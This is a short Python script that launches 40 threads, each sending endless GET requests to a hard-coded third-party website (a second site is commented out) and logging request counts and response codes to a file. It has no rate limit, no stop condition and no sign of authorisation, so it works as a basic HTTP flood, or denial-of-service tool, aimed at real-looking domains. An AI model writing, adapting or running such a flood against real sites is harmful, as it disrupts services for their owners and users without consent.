import datetime
import os
import threading

import requests

TOTAL_REQUESTS = 0
LOCK = threading.Lock()

def send_requests():
    global TOTAL_REQUESTS

    url = "https://sazibacademy.com/"
    # url = "https://piagency.tech/"
    while True:
        status_code = "540"
        try:
            response = requests.get(url)
            # You can process the response here if needed
            status_code = response.status_code

            # Increment the total requests and log to file
            with LOCK:
                TOTAL_REQUESTS += 1
                now = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
                log_entry = f"{now} - Thread-{threading.current_thread().name}: Total Requests: {TOTAL_REQUESTS}, Response Code: {status_code}\n"
                with open("log.txt", "a") as log_file:
                    log_file.write(log_entry)
        except:
            now = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
            log_entry = f"{now} - Thread-{threading.current_thread().name}: Total Requests: {TOTAL_REQUESTS}, Response Code: 500 - server denied the request \n"
            with open("log.txt", "a") as log_file:
                log_file.write(log_entry)

            continue

if __name__ == "__main__":
    threads = []
    for i in range(40):
        thread = threading.Thread(target=send_requests, name=f"Thread-{i+1}")
        thread.daemon = True
        threads.append(thread)

    # Start all threads
    for thread in threads:
        thread.start()

    # Join all threads (This will keep the program running indefinitely)
    for thread in threads:
        thread.join()

    # Since the threads are daemonic, this point will never be reached
